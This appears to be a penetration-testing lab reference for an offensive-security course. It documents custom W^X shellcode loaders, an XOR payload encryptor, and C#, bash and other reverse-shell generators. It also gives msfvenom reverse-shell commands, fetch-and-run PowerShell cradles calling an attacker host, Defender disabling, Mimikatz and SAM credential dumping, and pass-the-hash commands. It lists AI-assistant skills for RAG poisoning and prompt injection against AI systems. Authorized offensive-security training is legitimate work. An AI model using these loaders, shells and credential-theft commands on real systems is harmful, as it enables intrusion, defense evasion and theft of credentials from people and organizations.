# OSAI Field Reference

> OSAI · Lab Reference  
> Tools: `loader.py` · `linux_loader.py` · `xor_encrypt_bin.py` · `cs_revshell/gen.sh` · `gen_linux_shell.sh`

---

## Table of Contents

- [loader.py (Windows)](#loaderpy-windows)
- [linux\_loader.py](#linux_loaderpy)
- [xor\_encrypt\_bin.py](#xor_encrypt_binpy)
- [cs\_revshell / gen.sh (Windows target)](#cs_revshell--gensh-windows-target)
- [gen\_linux\_shell.sh (Linux target)](#gen_linux_shellsh-linux-target)
- [engagement arsenal](#engagement-arsenal)
- [Claude CLI OSAI Skills](#claude-cli-osai-skills)

---

## loader.py (Windows)

**Platform:** Windows · Python 3.8+

W^X shellcode loader. Allocates memory as RW via `VirtualAlloc`, copies shellcode, flips to RX via `VirtualProtect` before execution. Never allocates RWX. Cleans up with `VirtualFree` in a `finally` block.

### Quick start

**1. Generate shellcode**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shellcode.bin
```

**2. [Optional] Encrypt with xor_encrypt_bin.py**

```bash
python3 xor_encrypt_bin.py shellcode.bin --key 0xDEADBEEF
# Prints SHA256 (plaintext) and ready-to-run loader.py command
```

**3. Start listener, transfer, run**

```bash
# Kali — listener
rlwrap nc -lvnp 4444
```

```powershell
# Windows target
python loader.py shellcode.bin
python loader.py shellcode.enc --key 0xDEADBEEF --checksum <sha256hex> --verbose
python loader.py shellcode.bin --timeout 120
python loader.py shellcode.bin --timeout 0   # wait indefinitely
```

> **Order matters:** loader.py decrypts first, then verifies checksum.
> Always pass the SHA256 of the **plaintext** to `--checksum`.

### CLI Reference

| Argument | Type | Default | Description |
|---|---|---|---|
| `shellcode_file` | path | — | Raw or XOR-encrypted `.bin` file |
| `--key HEX` | hex string | none | XOR key (`0xDEADBEEF`, `DEADBEEF`, `0xAB`). Cyclic. Omit for plaintext. |
| `--checksum SHA256` | hex string | none | SHA256 of the *decrypted* shellcode. Aborts on mismatch. |
| `--timeout N` | int (s) | 30 | Max seconds to wait. `0` = INFINITE. |
| `--verbose` | flag | off | DEBUG output. |

### Memory Lifecycle

```
VirtualAlloc        PAGE_READWRITE      ← writable, not executable
RtlMoveMemory       copy shellcode      ← write while RW
VirtualProtect      PAGE_EXECUTE_READ   ← write bit removed
CreateThread        addr → shellcode
WaitForSingleObject timeout_ms
──── finally ────
VirtualFree         MEM_RELEASE         ← always released
```

---

## linux_loader.py

**Platform:** Linux · Python 3.8+

Linux equivalent of `loader.py`. Uses `mmap`/`mprotect`/`munmap` (libc via ctypes) instead of Win32 API. Same W^X enforcement, same CLI interface, same `--key` / `--checksum` format.

### Quick start

```bash
# 1. Generate Linux shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shellcode.bin

# 2. [Optional] Encrypt
python3 xor_encrypt_bin.py shellcode.bin --key 0xDEADBEEF

# 3. Listener
rlwrap nc -lvnp 4444

# 4. Linux target
python3 linux_loader.py shellcode.bin
python3 linux_loader.py shellcode.enc --key 0xDEADBEEF --checksum <sha256> --verbose
python3 linux_loader.py shellcode.bin --timeout 60
python3 linux_loader.py shellcode.bin --timeout 0   # no timeout
```

### CLI Reference

| Argument | Type | Default | Description |
|---|---|---|---|
| `shellcode_file` | path | — | Raw or XOR-encrypted `.bin` file |
| `--key HEX` | hex string | none | XOR key. Same format as `loader.py`. |
| `--checksum SHA256` | hex string | none | SHA256 of the *decrypted* shellcode. |
| `--timeout N` | int (s) | 30 | Max seconds (uses SIGALRM). `0` = no timeout. |
| `--verbose` | flag | off | DEBUG output. |

### Memory Lifecycle

```
mmap        PROT_READ|PROT_WRITE      ← writable, not executable
memcpy      copy shellcode             ← write while RW
mprotect    PROT_READ|PROT_EXEC       ← write bit removed
cfunctype   call shellcode as function
SIGALRM     timeout guard
──── finally ────
munmap      release region             ← always released
```

### Key Differences vs loader.py

| | loader.py (Windows) | linux_loader.py |
|---|---|---|
| Allocation | `VirtualAlloc` | `mmap` (MAP_PRIVATE \| MAP_ANONYMOUS) |
| Copy | `RtlMoveMemory` | `memcpy` |
| W^X flip | `VirtualProtect` | `mprotect` |
| Execution | `CreateThread` + `WaitForSingleObject` | `ctypes.CFUNCTYPE` direct call |
| Timeout | Thread timeout (ms) | `SIGALRM` (seconds) |
| Cleanup | `VirtualFree` (MEM_RELEASE) | `munmap` |
| Error info | `GetLastError` + `FormatMessageW` | `errno` + `strerror` |

---

## xor_encrypt_bin.py

**Platform:** Any (pure Python, no OS-specific calls)

Companion to both `loader.py` and `linux_loader.py`. Pre-encrypts shellcode before dropping it on the target. Uses the same key format, writes a raw `.enc` file, and prints both SHA256 hashes + ready-to-run loader command.

### Usage Examples

```bash
# Random 4-byte key (default)
python3 xor_encrypt_bin.py shellcode.bin

# Fixed key, explicit output
python3 xor_encrypt_bin.py shellcode.bin --key 0xDEADBEEF -o /tmp/drop/sc.enc

# Random 16-byte key + round-trip verify
python3 xor_encrypt_bin.py shellcode.bin --key-len 16 --verify

# Pipe encrypted bytes to another tool
python3 xor_encrypt_bin.py shellcode.bin --key 0xAB --stdout | xxd | head
```

### Example Output

```
[+] Input      : shellcode.bin  (510 bytes)
[+] Output     : shellcode.enc  (510 bytes)
[+] Key source : generated
[+] Key (hex)  : 0x7F2AE194  (4 bytes, cyclic)
[+] SHA256 PT  : a3f8c2d1...
    └─ plaintext hash  →  pass to loader.py --checksum
[+] SHA256 CT  : d91b4489...
    └─ ciphertext hash →  verify transfer integrity

── loader.py command (run on target) ──────────────────────────────────
   python loader.py shellcode.enc --key 0x7F2AE194 --checksum a3f8c2d1...
───────────────────────────────────────────────────────────────────────
```

### CLI Reference

| Argument | Type | Default | Description |
|---|---|---|---|
| `input` | path | — | Raw `.bin` to encrypt |
| `-o / --output PATH` | path | `<input>.enc` | Output path |
| `--key HEX` | hex string | none | XOR key. Omit to auto-generate. |
| `--key-len N` | int | 4 | Random key length (1–32). Ignored when `--key` is set. |
| `--verify` | flag | off | Round-trip verify. Exits `1` on mismatch. |
| `--stdout` | flag | off | Binary output to stdout for piping. |
| `--verbose` | flag | off | DEBUG output + per-byte key. |

---

## cs_revshell / revgen.sh (Windows target)

**Platform:** Run on Kali · Target: Windows

Generates a C# reverse shell with a 4-byte cyclic XOR key and fully randomised identifiers per run. Reconnect loop with jitter and back-off. UTF-8 I/O. Single `shell.cs` ready to compile.

### Quick Start

```bash
chmod +x cs_revshell/gen.sh
rlwrap nc -lvnp 5986

# Defaults: tun0, port 5986, ./, 5 retries, 3000 ms jitter
./cs_revshell/gen.sh

# Custom
./cs_revshell/gen.sh eth0 443 /tmp/drop 10 1000

# Compile on Kali → drop exe
TERM=dumb mcs -out:svc.exe shell.cs
python3 -m http.server 8080
```

```powershell
# Windows target
certutil -urlcache -split -f http://<LHOST>:8080/svc.exe svc.exe
.\svc.exe
```

### Arguments

| Position | Default | Description |
|---|---|---|
| `$1` interface | `tun0` | Network interface for LHOST |
| `$2` port | `5986` | Listener port (1–65535) |
| `$3` output\_dir | `.` | Output directory for `shell.cs` |
| `$4` max\_retries | `5` | Reconnect attempts before exit |
| `$5` jitter\_ms | `3000` | Max random sleep (ms) before connect |

---

## gen_linux_shell.sh (Linux target)

**Platform:** Run on Kali · Target: Linux

Generates 7 reverse shell payloads in one shot, all pre-populated with LHOST/LPORT. Pick whichever fits the target environment.

### Quick Start

```bash
chmod +x gen_linux_shell.sh

# Defaults: tun0, port 4444, output ./shells/
./gen_linux_shell.sh

# Custom: eth0, port 443, output /tmp/drop
./gen_linux_shell.sh eth0 443 /tmp/drop

# Listener
rlwrap nc -lvnp 4444
```

### Generated Payloads

| File | Language | Notes |
|---|---|---|
| `bash_shell.sh` | Bash | `/dev/tcp` one-liner — most compatible, no dependencies |
| `python_shell.py` | Python 3 | PTY spawn — full interactive shell |
| `socat_shell.sh` | Bash/socat | Interactive TTY — best quality, requires socat on target |
| `nc_shell.sh` | Bash/nc | mkfifo trick — no `-e` flag required |
| `perl_shell.pl` | Perl | Socket shell — Perl is almost always installed |
| `php_shell.php` | PHP | For web shell upload scenarios |
| `elf_revshell.c` | C | Compile to native ELF: `gcc -o revshell elf_revshell.c` |

### Arguments

| Position | Default | Description |
|---|---|---|
| `$1` interface | `tun0` | Network interface for LHOST |
| `$2` port | `4444` | Listener port (1–65535) |
| `$3` output\_dir | `./shells` | Output directory (created if missing) |

### Shell Upgrade (after catching any shell)

```bash
# On target — upgrade to full PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## engagement arsenal

### Custom Tools Status

| Tool | Platform | Description | Status |
|---|---|---|---|
| `loader.py` | Windows | W^X shellcode loader — VirtualAlloc/VirtualProtect | ✅ Done |
| `linux_loader.py` | Linux | W^X shellcode loader — mmap/mprotect | ✅ Done |
| `xor_encrypt_bin.py` | Any | Shellcode encryptor — SHA256 + loader command output | ✅ Done |
| `cs_revshell/gen.sh` | → Windows | C# revshell — XOR, identifier randomisation, reconnect | ✅ Done |
| `gen_linux_shell.sh` | → Linux | 7 reverse shell payloads in one shot | ✅ Done |
| `rlwrap + nc` | Kali | Listener with readline | ⚠️ Confirm installed |
| `winPEAS.exe` | Windows | Local priv esc enumeration | ⚠️ Grab if missing |
| `linPEAS.sh` | Linux | Local priv esc enumeration | ⚠️ Grab if missing |
| `PowerView.ps1` | Windows | AD enumeration | ⚠️ Grab if missing |

---

### Claude CLI OSAI Skills

Pre-built skills available via slash commands during the engagement:

| Skill | Command | What it does |
|---|---|---|
| Parallel Recon | `/osai-parallel-recon` | Fan out nmap/enum4linux/gobuster across hosts, triage by severity |
| Output Triage | `/osai-triage` | Score raw tool output by severity, extract high-value lines |
| WinPEAS/LinPEAS Parser | `/osai-winpeas` | Extract critical privesc findings, map to exploitation commands |
| Linux PrivEsc | `/osai-linux-attack` | Find Linux priv esc paths, produce GTFObins/exploit commands |
| AD Attack Paths | `/osai-ad-attack` | Find AD attack paths from enum output, produce exploitation commands |
| AI Surface Hunter | `/osai-ai-hunter` | Fingerprint LLM APIs, chatbots, RAG endpoints, MCP servers |
| RAG Attack | `/osai-rag-attack` | Enumerate RAG pipeline, craft poison docs, indirect prompt injection |
| Credential Vault | `/osai-cred-vault` | Log, deduplicate, query all recovered credentials |
| Pivot / Ligolo | `/osai-pivot` | Generate Ligolo-ng tunnel commands, maintain tunnel map |
| Engagement Init | `/osai-engage` | Set up dirs, load scope, configure tunnel, prep C2 listener |
| Finding Notes | `/osai-notes` | Structured finding capture with SysReptor-ready markdown |
| Report Formatter | `/osai-report` | Compile findings into SysReptor-paste-ready report structure |

---

### Listeners

```bash
rlwrap nc -lvnp PORT          # best — readline support
nc -lvnp PORT                 # fallback without rlwrap
# Metasploit multi/handler   → for staged payloads, match PAYLOAD arch
```

---

### msfvenom Formats

```bash
# Windows
-p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444
-f raw    # for loader.py
-f exe    # standalone

# Linux
-p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444
-f raw    # for linux_loader.py
-f elf    # standalone

# Common flags
-a x64 --platform win|linux
-e x86/shikata_ga_nai -i 3    # encoder
```

---

### File Transfer

```bash
# Kali — serve
python3 -m http.server 8080

# Linux target — download
wget http://<LHOST>:8080/file -O file
curl http://<LHOST>:8080/file -o file

# Windows target — download
certutil -urlcache -split -f http://<LHOST>:8080/file.exe file.exe
powershell Invoke-WebRequest http://<LHOST>:8080/file.exe -OutFile file.exe
powershell (New-Object Net.WebClient).DownloadFile('http://<LHOST>:8080/file.exe','file.exe')

# SMB share (Kali)
impacket-smbserver share . -smb2support
# Windows: copy \\<LHOST>\share\file.exe .
```

---

### Privilege Escalation — Windows

```powershell
.\winPEAS.exe
whoami /priv

# Key privileges:
# SeImpersonatePrivilege → Potato family (PrintSpoofer, GodPotato)
# SeBackupPrivilege      → read any file, dump SAM
# SeDebugPrivilege       → inject into SYSTEM processes

IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:8080/PowerUp.ps1')
Invoke-AllChecks
```

### Privilege Escalation — Linux

```bash
./linpeas.sh

sudo -l                           # sudo misconfig
find / -perm -4000 2>/dev/null    # SUID binaries
find / -writable 2>/dev/null      # writable paths
cat /etc/crontab                  # cron jobs
ls -la /etc/passwd /etc/shadow    # readable shadow?
getcap -r / 2>/dev/null           # capabilities

# GTFObins: https://gtfobins.github.io/
```

---

### AD Enumeration

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:8080/PowerView.ps1')

Get-DomainUser
Get-DomainGroup -Identity "Domain Admins" | Select-Object member
Get-DomainTrust
Get-DomainUser -SPN                   # Kerberoastable
Find-LocalAdminAccess
Get-ObjectAcl -Identity <user> -ResolveGUIDs
```

---

### Credential Access

```powershell
# Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# Offline SAM dump (admin shell)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# Crack: impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Pass-the-hash
crackmapexec smb <TARGET> -u <USER> -H <HASH>
```

---

### PowerShell Quick Reference

```powershell
powershell -ep bypass
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>:8080/script.ps1')
Set-MpPreference -DisableRealtimeMonitoring $true
whoami /groups | findstr "S-1-5-32-544"
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
```

### Linux Quick Reference

```bash
# System info
uname -a && cat /etc/*release
id && whoami && hostname

# Network
ip a && ss -tlnp
cat /etc/hosts && cat /etc/resolv.conf

# Users
cat /etc/passwd | grep -v nologin | grep -v false
last -a

# Processes
ps auxf
```
